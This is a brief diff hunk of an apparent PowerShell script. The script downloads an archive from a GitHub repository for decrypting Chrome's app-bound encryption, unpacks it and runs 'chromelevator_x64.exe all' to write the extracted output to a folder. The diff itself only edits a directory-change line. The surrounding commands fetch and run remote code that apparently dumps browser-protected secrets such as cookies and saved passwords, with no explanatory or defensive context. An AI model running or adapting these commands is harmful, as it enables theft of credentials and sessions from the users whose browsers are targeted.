@@ -5,7 +5,7 @@ iwr -Uri "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/relea
 
 Expand-Archive -Path "data.zip" -DestinationPath "ext" -Force
 
-cd ext\*
+cd ext
 
 .\chromelevator_x64.exe all -f -o out
 
